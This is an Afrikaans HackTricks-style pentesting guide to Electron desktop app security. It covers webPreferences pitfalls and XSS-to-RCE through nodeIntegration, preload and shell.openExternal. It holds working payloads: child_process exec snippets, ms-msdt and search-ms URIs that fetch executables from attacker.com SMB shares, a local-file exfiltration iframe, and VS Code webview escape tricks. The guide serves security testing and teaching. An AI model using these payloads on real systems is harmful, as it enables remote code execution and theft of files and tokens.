# Electron Desktop Apps

{{#include ../../banners/hacktricks-training.md}}

## Inleiding

Electron kombineer ’n bevoorregte **Node.js**-hoofproses met **Chromium**-weergaweprosesse. Electron is nie ’n webblaaier nie: toepassingskode kan doelbewus vermoëns soos toegang tot die lêerstelsel en shell blootstel, dus vereis die laai van onbetroubare inhoud strenger grensontwerp as ’n gewone webwerf.<sup>[[21]](#references)</sup>

Electron-toepassingskode word gewoonlik in ’n `.asar`-argief verpak. Pak dit uit voordat jy die bronkode hersien:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

Die toepassing se `package.json` identifiseer sy hoofintreepunt. Daardie lêer skep gewoonlik renderer-vensters en stel hul sekuriteitsensitiewe `webPreferences` in.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron het twee hoofprosestipes:

- Main Process (het volledige toegang tot NodeJS)
- Renderer Process (behoort om sekuriteitsredes beperkte toegang tot NodeJS te hê)

![Electron Desktop Apps - Inleiding: Renderer Process (behoort om sekuriteitsredes beperkte toegang tot NodeJS te hê)](<../../images/image (182).png>)

'n **renderer process** sal 'n blaaiervenster wees wat 'n lêer laai:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

Die **main process** konfigureer elke renderer process, gewoonlik wanneer ’n `BrowserWindow` geskep word. Veilige instellings verminder die kans dat ’n gekompromitteerde renderer process tot native code execution kan lei, maar maak nie onbetroubare inhoud inherent veilig nie.<sup>[[21]](#references)[[22]](#references)</sup>

Gaan ten minste hierdie renderer-voorkeure na:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** is by verstek `false`. As dit geaktiveer word, kry renderer-JavaScript toegang tot Node.js-API’s en word daardie renderer se sandbox ook gedeaktiveer.
- **`contextIsolation`** is by verstek `true`. Dit skei die bladsy se JavaScript-konteks van die konteks wat deur preload-skripte en Electron-internals gebruik word.
- **`preload`** het geen verstekpad nie. ’n Gekonfigureerde preload-skrip loop voordat bladsyskripte loop en kan streng afgebakende API’s via `contextBridge` blootstel.
- **`sandbox`** is sedert Electron 20 by verstek `true`. Dit beperk die renderer se toegang tot bedryfstelselhulpbronne; as `nodeIntegration: true` gestel word, word dit gedeaktiveer.
- **`nodeIntegrationInWorker`** is by verstek `false` en beheer Node.js-integrasie in Web Workers.
- **`nodeIntegrationInSubFrames`** is by verstek `false`.
  - As **`nodeIntegration`** **geaktiveer** is, laat dit die gebruik van **Node.js-API’s** toe in webblaaie wat **in iframes gelaai** word binne ’n Electron-toepassing.
  - As **`nodeIntegration`** **gedeaktiveer** is, laai preloads in die iframe

Voorbeeld van konfigurasie:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Sommige **RCE payloads** van [hier](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Vang verkeer op

Wysig die start-main-konfigurasie en voeg die gebruik van ’n proxy by, soos:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Statiese nasporing van ASAR-na-native-grense met REA

**REA** kan ’n ASAR- of onttrekte toepassingsgids lees sonder om sy JavaScript-bootstrap uit te voer. Die toepassingsgrafiek teken pakketinskappunte, gebondelde modules, `BrowserWindow`- en preload-instellings, `contextBridge`-lede, IPC-registrasies, versoeke om native-byvoegings en source-map-identiteite aan. Dit bied ’n beginpunt om ’n renderer-blootgestelde vermoë na ’n bevoorregte hoofproses-hanteerder na te spoor.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Vir ’n letterlike kenmerkstring, stuur die volledige Evidence-rekord as `application` deur en vervang die seed met een wat in die teiken waargeneem is:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Dieselfde `trace_application_feature`-werkvloei aanvaar ook ’n waargenome letterlike API-lid, IPC-kanaal of module as saad. Gaan die resulterende hanteerderpad, valideringskandidate en inheemse oorhandiging na aan die hand van die teruggekeerde bronliggings. ’n Renderer-`invoke` pas slegs by een unieke `ipcMain.handle`/`handleOnce`-kandidaat op presies dieselfde letterlike kanaal; `send` vereis eweneens een unieke `ipcMain.on`/`once`/`addListener`-kandidaat. Dinamiese of duplikaat-hanteerders bly onopgelos. ’n Versoekte `.node`-lid is nie ’n geverifieerde inheemse uitvoer nie; ooreenstemmende Hopper/Ghidra-bewyse moet dieselfde artefakdigest hê voordat dié gevolgtrekking gemaak word. Statiese bereikbaarheid bewys ook nie dat die pad uitgevoer is nie.<sup>[[24]](#references)[[25]](#references)</sup>

Vir die vertrouensgrens tussen renderer en main en hanteerdervalidering, sien [Electron contextIsolation RCE via IPC](electron-contextisolation-rce-via-ipc.md).

Vir inheemse opvolgwerk wat aan ’n verskaffer gebind is, sien [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Electron se aanvaloppervlak vir outomatiese opdaterings

Vir integriteit van vrystellingsvoere, terugrol, verwarring oor ondertekende kanale en TOCTOU met stellêers, sien [Electron auto-update trust boundaries](electron-auto-update-trust-boundaries.md).

## Electron Local Code Injection

Met plaaslike skryf- of instrumentasietoegang tot ’n geïnstalleerde toepassing, sien [Electron local code injection and snapshot tampering](electron-local-code-injection-and-snapshot-tampering.md) vir ASAR-/main-process- en V8-snapshotpaaie, asook die OS-spesifieke skakels.

## RCE: XSS + nodeIntegration

As **nodeIntegration** op **on** gestel is, kan ’n webblad se JavaScript maklik Node.js-funksies gebruik deur bloot `require()` aan te roep. Byvoorbeeld, die manier om die calc-toepassing op Windows uit te voer, is:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Die script wat in hierdie instelling aangedui word, word **voor ander scripts in die renderer gelaai**, dus het dit **onbeperkte toegang tot Node-API's**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Daarom kan die script node-features na bladsye uitvoer:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **As `contextIsolation` aan is, sal dit nie werk nie**

## RCE: XSS + contextIsolation

_**contextIsolation**_ skep **geskeide kontekste tussen die webblad se skrifte en Electron se interne JavaScript-kode**, sodat die JavaScript-uitvoering van elke stuk kode nie die ander beïnvloed nie. Dit is ’n noodsaaklike kenmerk om die moontlikheid van RCE uit te skakel.

As die kontekste nie geïsoleer is nie, kan ’n aanvaller:

1. **Willekeurige JavaScript in die renderer uitvoer** (XSS of navigasie na eksterne webwerwe)
2. **Die ingeboude metode oorskryf** wat in preload- of Electron-interne kode gebruik word, met ’n eie funksie
3. Die gebruik van die **oorskryfde funksie aktiveer**
4. RCE?

Daar is 2 plekke waar ingeboude metodes oorskryf kan word: in preload-kode of in Electron se interne kode:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Omseiling van klikgebeurtenis

As daar beperkings toegepas word wanneer jy op ’n skakel klik, kan jy dit dalk omseil deur eerder ’n middelklik as ’n gewone linksklik te doen.

```javascript
window.addEventListener('click', (e) => {
```

## RCE via shell.openExternal

Vir meer inligting oor hierdie voorbeelde, kyk na [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) en [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Wanneer ’n Electron-desktoptoepassing ontplooi word, is dit noodsaaklik om seker te maak dat die instellings vir `nodeIntegration` en `contextIsolation` korrek is. Daar is vasgestel dat hierdie instellings effektief kliëntkant-uitvoering van afgeleë kode (RCE) teen preload-skripte of Electron se native kode vanuit die hoofproses voorkom.

Wanneer ’n gebruiker met skakels interaksie het of nuwe vensters oopmaak, word spesifieke gebeurtenisluisteraars geaktiveer. Hierdie luisteraars is noodsaaklik vir die toepassing se sekuriteit en funksionaliteit:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Hierdie listeners word **deur die desktop application oorskryf** om sy eie **besigheidslogika** te implementeer. Die toepassing bepaal of ’n skakel waarop navigeer is intern of in ’n eksterne webblaaier oopgemaak moet word. Hierdie besluit word gewoonlik deur ’n funksie, `openInternally`, geneem. As hierdie funksie `false` teruggee, dui dit aan dat die skakel ekstern oopgemaak moet word deur die `shell.openExternal`-funksie te gebruik.

**Hier is vereenvoudigde pseudokode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Electron JS-sekuriteit se beste praktyke raai af om onbetroubare inhoud met die `openExternal`-funksie te aanvaar, aangesien dit via verskeie protokolle tot RCE kan lei. Bedryfstelsels ondersteun verskillende protokolle wat RCE kan veroorsaak. Vir gedetailleerde voorbeelde en verdere verduideliking oor hierdie onderwerp, kan jy [hierdie bron](https://positive.security/blog/url-open-rce#windows-10-19042) raadpleeg, wat Windows-protokolvoorbeelde insluit waarmee hierdie kwesbaarheid uitgebuit kan word.<sup>[[10]](#references)</sup>

In macOS kan die `openExternal`-funksie uitgebuit word om arbitrêre opdragte uit te voer, soos in `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Voorbeelde van Windows-protokoluitbuitings sluit in:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + kwesbare preload IPC + shell.openExternal

Hierdie kwesbaarheid kan in **[hierdie verslag](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)** gevind word.<sup>[[11]](#references)</sup>

Die **webviewTag** is ’n **verouderde kenmerk** wat die gebruik van **NodeJS** in die **renderer process** toelaat. Dit behoort gedeaktiveer te word, aangesien dit toelaat dat ’n script binne die preload-konteks gelaai word, soos:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Gevolglik kon ’n aanvaller wat daarin slaag om ’n arbitrêre bladsy te laai, daardie tag gebruik om **’n arbitrêre preload script te laai**.

Hierdie preload script is toe misbruik om ’n **kwesbare IPC-diens (`skype-new-window`)** aan te roep, wat **`shell.openExternal`** aangeroep het om RCE te verkry:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Lees van interne lêers: XSS + contextIsolation

**Deur `contextIsolation` te deaktiveer, kan `<webview>`-tags**, soortgelyk aan `<iframe>`, gebruik word om plaaslike lêers te lees en te eksfiltreer. ’n Voorbeeld wys hoe om hierdie kwesbaarheid uit te buit om die inhoud van interne lêers te lees:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Lees van interne lêers: XSS + contextIsolation: Deur contextIsolation te deaktiveer, kan tags gebruik word, soortgelyk aan , om...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Verder word ’n ander metode gedeel om **’n interne lêer te lees**, wat ’n kritieke kwesbaarheid vir die lees van plaaslike lêers in ’n Electron-desktoptoepassing beklemtoon. Dit behels dat ’n script ingevoeg word om die toepassing uit te buit en data te eksfiltreer:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Ou Chromium**

As die **Chromium**-weergawe wat saam met die toepassing gebundel is oud is en bekende kwesbaarhede het, kan dit moontlik wees om dit uit te buit en XSS in RCE te omskep.<sup>[[20]](#references)</sup>\
Jy kan ’n voorbeeld in hierdie **writeup** sien: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **XSS Phishing via interne URL-regex-bypass**

As jy XSS vind, maar **nie RCE kan aktiveer of interne lêers kan steel nie**, kan jy steeds probeer om **geloofsbriewe via phishing te steel**.<sup>[[1]](#references)</sup>

Inspekteer eers die front-end-kode om te bepaal wat gebeur wanneer ’n nuwe URL oopgemaak word:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

Die oproep na **`openInternally`** bepaal of ’n platforms skakel in die **lessenaarvenster** oopmaak, of ’n derdepartyhulpbron in die stelselblaaier oopmaak.

As die URL-allowlist-regex van die funksie omseil kan word—byvoorbeeld omdat punte in ’n gasheernaam nie ge-escape is nie—kan ’n aanvaller XSS misbruik om ’n oortuigende aanmeldboodskap op infrastruktuur onder die aanvaller se beheer oop te maak:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://`-protokol

Soos genoem in [die Electron-sekuriteitsgids](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), kry bladsye wat op **`file://`** loop, breë lêertoegang. Gevolglik kan **XSS gebruik word om arbitrêre lêers** vanaf die gebruiker se masjien te laai. ’n Behoorlik ontwerpte **custom protocol** kan toegang tot ’n spesifieke stel lêers beperk.<sup>[[21]](#references)</sup>

Vir ’n afsonderlike omseiling van lêeromvang in die werkerkonteks van voorskoue in desktop-assistente, sien [AI assistant embedded browser trust boundaries](../../AI/AI-Embedded-Browser-Trust-Boundaries.md#worker-context-bypass-of-a-local-previews-file-scope).

## Remote-module

Die Electron Remote-module stel **renderer-prosesse in staat om toegang tot main-proses-API’s te kry**, wat kommunikasie binne ’n Electron-toepassing vergemaklik. Die aktivering van hierdie module hou egter beduidende sekuriteitsrisiko’s in. Dit vergroot die toepassing se aanvalsvlak en maak dit meer vatbaar vir kwesbaarhede soos cross-site scripting (XSS)-aanvalle.

> [!TIP]
> Hoewel die **remote**-module sommige API’s van main aan renderer-prosesse blootstel, is dit nie maklik om RCE te kry deur slegs die komponente te misbruik nie. Die komponente kan egter sensitiewe inligting blootstel.

> [!WARNING]
> Baie toepassings wat steeds die remote-module gebruik, doen dit op ’n manier wat vereis dat NodeIntegration in die renderer-proses geaktiveer is, wat ’n **groot sekuriteitsrisiko** is.

Electron se ingeboude `remote`-module is afgekeur en daarna verwyder; toepassings wat steeds die model daarvan benodig, kan die afsonderlike `@electron/remote`-pakket gebruik. Weens die sekuriteits- en werkverrigtingsimplikasies moet remote-agtige vermoëns nie aan onvertroude renderers blootgestel word nie.

Met `@electron/remote` moet dit eers **in die main-proses geïnisialiseer word**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Die renderer-proses kan dan voorwerpe vanaf die module invoer:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

Die **[blogplasing](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** dui op ’n paar interessante **funksies** wat deur die objek **`app`** van die remote-module beskikbaar gestel word:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Herbegin** die toepassing deur die huidige instansie te **verlaat** en ’n nuwe een te **begin**. Nuttig vir **programopdaterings** of beduidende **statusveranderinge**.
- **`app.setAppLogsPath([path])`**  
   - **Definieer** of **skep** ’n gids waarin **programlogs** gestoor word. Die logs kan met **`app.getPath()`** of **`app.setPath(pathName, newPath)`** **opgehaal** of **gewysig** word.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Registreer** die huidige uitvoerbare lêer as die **verstekhanteerder** vir ’n gespesifiseerde **protokol**. Jy kan ’n **pasgemaakte pad** en **argumente** verskaf indien nodig.
- **`app.setUserTasks(tasks)`**  
   - **Voeg** take by die **Take-kategorie** in die **Jump List** (op Windows). Elke taak kan beheer hoe die toepassing **begin** of watter **argumente** deurgegee word.
- **`app.importCertificate(options, callback)`**  
   - **Voer** ’n **PKCS#12-sertifikaat** in die stelsel se **sertifikaatstoor** in (slegs Linux). ’n **Terugbel** kan gebruik word om die resultaat te hanteer.
- **`app.moveToApplicationsFolder([options])`**  
   - **Skuif** die toepassing na die **Applications-lêergids** (op macOS). Dit help om ’n **standaardinstallasie** vir Mac-gebruikers te verseker.
- **`app.setJumpList(categories)`**  
   - **Stel** ’n **pasgemaakte Jump List** op Windows **in** of **verwyder** dit. Jy kan **kategorieë** spesifiseer om te bepaal hoe take aan die gebruiker vertoon word.
- **`app.setLoginItemSettings(settings)`**  
   - **Stel in** watter **uitvoerbare lêers** saam met hul **opsies** by **aanmelding** begin (slegs macOS en Windows).
  
Voorbeeld:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences-module

Die **primêre API** vir toegang tot stelselvoorkeure en die **uitstuur van stelselgebeurtenisse** in Electron. Metodes soos **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** en **setUserDefault** is almal **deel van** hierdie module.

**Voorbeeldgebruik:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Luister** na **inheemse macOS-kennisgewings** met NSDistributedNotificationCenter.  
* Voor **macOS Catalina** kon jy **alle** verspreide kennisgewings onderskep deur **nil** aan CFNotificationCenterAddObserver deur te gee.  
* Ná **Catalina / Big Sur** kan sandboxed apps steeds op **baie gebeurtenisse** inteken (byvoorbeeld **skermslotte/-ontsluitings**, **volumemonterings**, **netwerkaktiwiteit**, ens.) deur kennisgewings **volgens naam** te registreer.

### **getUserDefault / setUserDefault**

* Koppel aan **NSUserDefaults**, wat **toepassings-** of **globale** voorkeure op macOS stoor.
    
* **getUserDefault** kan sensitiewe inligting **herwin**, soos **onlangse lêerliggings** of die **geografiese ligging van die gebruiker**.
    
* **setUserDefault** kan hierdie voorkeure **wysig**, wat moontlik ’n app se **konfigurasie** beïnvloed.
    
* In **ouer Electron-weergawes** (voor v8.3.0) was slegs die **standaard suite** van NSUserDefaults **toeganklik**.

## Shell.showItemInFolder

Hierdie funksie wys die gegewe lêer in ’n lêerbestuurder. Op geaffekteerde platforms en weergawes kon daardie handeling **die lêer outomaties uitvoer**.

Vir meer inligting, kyk na [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Electron-apps behoort ’n **Content Security Policy (CSP)** te hê om **XSS-aanvalle te voorkom**. Die **CSP** is ’n **sekuriteitstandaard** wat help om die **uitvoering** van **ongemagtigde kode** in die blaaier te **voorkom**.

Dit word gewoonlik in die **`main.js`**-lêer of in die **`index.html`**-sjabloon met die CSP in ’n **meta tag** **opgestel**.

Vir meer inligting, kyk na:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

Hierdie werklike aanvalsketting het Visual Studio Code 1.63 (CVE-2021-43908) geraak en wys hoe ’n enkele markdown-gedrewe XSS in ’n webview tot volledige RCE opgeskaal kan word wanneer CSP, postMessage en skemahanteerders verkeerd opgestel is. Openbare PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Oorsig van aanvalsketting
- Eerste XSS via webview-CSP: Die gegenereerde CSP het `style-src 'self' 'unsafe-inline'` ingesluit, wat inline-/stylgebaseerde inspuiting in ’n `vscode-webview://`-konteks toegelaat het. Die payload het ’n sein na `/stealID` gestuur om die teiken-webview se extensionId te eksfiltreer.
- Bou van die teiken-webview-URL: Gebruik die leaked ID om `vscode-webview://<extensionId>/.../<publicUrl>` te bou.
- Tweede XSS via postMessage-trust: Die buitenste webview het `window.postMessage` vertrou sonder streng kontrole van die oorsprong/tipe en aanvaller-HTML met `allowScripts: true` gelaai.
- Laai van plaaslike lêer via herskrywing van skema/pad: Die payload het `file:///...` na `vscode-file://vscode-app/...` herskryf en `exploit.md` met `RCE.html` vervang, deur swak padvalidering uit te buit om ’n bevoorregte plaaslike hulpbron te laai.
- RCE in Node-geaktiveerde konteks: Die gelaaide HTML is uitgevoer met Node-API’s beskikbaar, wat OS-opdraguitvoering moontlik gemaak het.

Voorbeeld van ’n RCE-primitief in die finale konteks
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Verwante leesstof oor vertrouenskwessies met postMessage:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: sintetiese webview-kortpaaie + verklarende uitbreiding-opdragbrûe

’n Ander klas VS Code-webview-ontsnappings het in Junie 2026 verskyn: **onvertroude JavaScript binne ’n notaboek-/voorskou-webview kon bevoorregte globale kortpaaie naboots**, omdat die webview-preload `keydown`-data na die gasheer se workbench aangestuur het en die gasheer dit as werklike gebruikersinvoer hanteer het.<sup>[[14]](#references)</sup>

Dit is deel van ’n breër geskiedenis van IDE-aanvalle op vertrouensgrense, waarin projekbeheerde inhoud bevoorregte redigeerderkenmerke bereik.<sup>[[19]](#references)</sup>

### Grensfaling

As ’n kruis-oorsprong-/sandboxed-webview aanvallerbeheerde sleutelbordvelde (`key`, `code`, `keyCode`, wysigers, `repeat`) na ’n bevoorregte `postMessage`-/message-port-brug kopieer **sonder om `event.isTrusted` na te gaan**, kan JavaScript binne die webview workbench-kortpaaie uitvoer met:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Dit is veral nuttig wanneer **sintetiese tikwerk deur die blaaier geblokkeer word**. Geskripte sleutelgebeurtenisse kan gewoonlik **nie arbitrêre teks in HTML-`<input>`-elemente tik nie**, maar hulle aktiveer steeds kortpaaie wat `keydown` direk verwerk.

### Praktiese misbruikpatrone

- **Misbruik van kortpadgerigte UI:** teiken globale bindings, soos aanvaarding van kennisgewings, navigasie deur palette, aktivering van gefokusde knoppies of beweging deur spyskaarte, in plaas daarvan om opdragte te probeer tik.
- **Voorspelbare bevoorregte aanporboodskappe uit werkruimte-metadata:** ’n bewaarplek-beheerde `.vscode/extensions.json` kan ’n aanvalleruitbreiding aanbeveel en ’n voorspelbare installasiekennisgewing skep wat met ’n kortpad soos `Ctrl+Shift+A` aanvaar kan word.
- **Deklaratiewe uitbreidingsmanifes as opdragbrug:** selfs al word plaaslike werkruimte-uitbreidingskode deur CSP in web VS Code geblokkeer, kan deklaratiewe `package.json`-bydraes steeds laai. ’n Plaaslike uitbreiding onder `.vscode/extensions` kan ’n sleutelbinding registreer wat `runCommands` en daarna ’n bevoorregte interne opdrag soos `workbench.extensions.installExtension` aanroep.<sup>[[14]](#references)[[18]](#references)</sup>

Voorbeeld van ’n manifespatroon:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Versteekte sekuriteitsvlae wat deur onbetroubare metadata bereik kan word:** as die interne opdrag aanvallerbeheerde argumente aanvaar, soos `{"context":{"skipPublisherTrust":true}}`, kan verklarende metadata ’n vertrouensdialoog onderdruk en ’n uitbreiding installeer wat op Marketplace/CDN gehuisves word en uiteindelik aanvallerkode uitvoer.
- **Misbruik van vertroude werkruimtes:** as afgeleë/webwerkruimtes outomaties vertrou word, word plaaslike werkruimte-uitbreidings ’n waardevolle brug vanaf bewaarplekinhoud na bevoorregte redigeerderhandelinge.
- **Verbreding van die omvang ná kompromittering:** nadat ’n uitbreiding uitgevoer is, ondersoek watter tokens die redigeerder aan uitbreidings beskikbaar stel. In `github.dev` was die gesteelde GitHub-token geldig buite die oopgemaakte bewaarplek; ’n versoek na `https://api.github.com/user/repos` het dus bykomende toeganklike private bewaarplekke gelys.

### Ouditnotas

- Behandel **die aanstuur van invoer vanaf webviews na die gasheer** as ’n bevoorregtingsgrens; stuur nooit sintetiese sleutel-/klikgebeurtenisse vanaf onbetroubare rame weer aan die gasheer aan nie.
- Dwing magtiging **binne** sensitiewe opdragte af. Moenie konteks wat deur die oproeper verskaf is, aanvaar as dit interne vlae soos `skipPublisherTrust` kan stel nie.
- Moenie aanvaar dat die blokkering van uitvoerbare plaaslike uitbreidingskode voldoende is nie; hersien ook **verklarende bydraes** (`keybindings`, `menus`, `commands`, take) uit werkruimtebeheerde manifeste.
- Die regstellings van 3 Junie 2026 het `isTrusted` by aangestuurde gebeurtenisse gevoeg, die aanstuur van onbetroubare sleutels in notaboek-webviews gedeaktiveer en opgehou om konteks vir installasie-opdragte wat deur die oproeper verskaf is, te aanvaar.<sup>[[16]](#references)[[17]](#references)</sup>

## **Gereedskap**

Die saamgestelde **awesome-electronjs-hacking**-versameling bied bykomende navorsing, gereedskap en hulpbronne oor kwesbare toepassings.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) is ’n hulpmiddel om wankonfigurasies en sekuriteitsteenpatrone in Electron-gebaseerde toepassings te identifiseer.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) is ’n oopbron-VS Code-inprop vir Electron-toepassings wat Electronegativity gebruik.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) kontroleer vir kwesbare derdeparty-biblioteke.
- [**Electro.ng**](https://electro.ng/) is ’n kommersiële Electron-sekuriteitsontledingshulpmiddel.

## Laboratoriums

By [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) kan jy ’n laboratorium vind om kwesbare Electron-toepassings uit te buit.<sup>[[4]](#references)</sup>

Hierdie opdragte help jou om deur die laboratorium te werk:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

